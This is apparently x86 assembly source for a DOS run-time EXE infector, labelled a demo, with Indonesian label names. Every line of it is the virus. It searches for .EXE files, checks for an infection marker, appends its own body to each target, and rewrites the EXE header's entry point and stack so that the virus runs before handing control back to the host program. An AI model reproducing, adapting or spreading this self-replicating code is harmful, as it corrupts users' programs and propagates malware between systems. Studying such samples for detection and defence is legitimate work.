; A run-time .EXE infector demo
	.Model	Tiny
	.Code
	.Radix	16
	.StartUp

Awal:
	call TrikPushIP

TrikPushIP:
	pop bp
	sub bp, Offset $ - 1

	push ds
	push es

	push cs
	pop ds
	push cs
	pop es

	mov ah, 1a
	lea dx, [bp + DTA]
	int 21

	mov ah, 4e
	lea dx, [bp + EXE]
	mov cx, 27
	int 21
	jc PindahKontrol

	mov ax, 3D02
	lea dx, [bp + DTA + 1E]
	int 21
	xchg ax, bx

	mov ah, 3f
	lea dx, [bp + Buffer]
	mov cx, 20
	int 21

	cmp 2 ptr [bp + Buffer], 'MZ'
	jz FileEXE
	cmp 2 ptr [bp + Buffer], 'ZM'
	jnz TutupFile

FileEXE:
	cmp 2 ptr [bp + Buffer + 12], 'LD'
	jz TutupFile

	push [bp+oCS]
	push [bp+oIP]
	push [bp+oSS]
	push [bp+oSP]
	call Infeksi
	pop [bp+oSP]
	pop [bp+oSS]
	pop [bp+oIP]
	pop [bp+oCS]

TutupFile:
	mov ah, 3E
	int 21

PindahKontrol:
	pop es
	pop ds

	mov ah, 1a
	mov dx, 80
	int 21

	mov ax, ds
	add ax, 10
	add [cs:bp + oCS], ax
	add [cs:bp + oSS], ax
	cli
	mov ss, [cs:bp + oSS]
	sti
	mov sp, [cs:bp + oSP]
	xor ax, ax
	xor bx, bx
	xor cx, cx
	xor dx, dx
	push [cs:bp+oCS]
	push [cs:bp+oIP]
	retf

oIP	dw ?
oCS	dw 0FFF0
oSS	dw 0FFF0
oSP	dw ?
EXE	db '*.EXE', 0

Infeksi:
	mov ax, 2 ptr [bp + Buffer + 0E]
	mov [bp + oSS], ax
	mov ax, 2 ptr [bp + Buffer + 10]
	mov [bp + oSP], ax
	mov ax, 2 ptr [bp + Buffer + 14]
	mov [bp + oIP], ax
	mov ax, 2 ptr [bp + Buffer + 16]
	mov [bp + oCS], ax

	mov ax, 4202
	xor cx, cx
	cwd
	int 21

	push dx ax

	push bx
	mov bx, 2 ptr [bp + Buffer + 8]
	mov cl, 4
	shl bx, cl
	sub ax, bx
	sbb dx, 0
	pop bx

	mov cx, 10
	div cx

	mov 2 ptr [bp + Buffer + 14], dx
	mov 2 ptr [bp + Buffer + 16], ax
	mov 2 ptr [bp + Buffer + 0E], ax
	mov 2 ptr [bp + Buffer + 10], -2
	mov 2 ptr [bp + Buffer + 12], 'LD'

	pop ax dx

	add ax, BesarVirus
	adc dx, 0

	mov cx, 200
	div cx
	cmp dx, 0
	jz $ + 3
	inc ax

	mov 2 ptr [bp + Buffer + 2], dx
	mov 2 ptr [bp + Buffer + 4], ax

	mov ah, 40
	mov cx, BesarVirus
	lea dx, [bp + Awal]
	int 21

	mov ax, 4200
	cwd
	xor cx, cx
	int 21

	mov ah, 40
	mov cx, 20
	lea dx, [bp + Buffer]
	int 21
	ret

DTA	db 43 dup (?)
Buffer	= $
BesarVirus = Offset DTA - Offset Awal
	End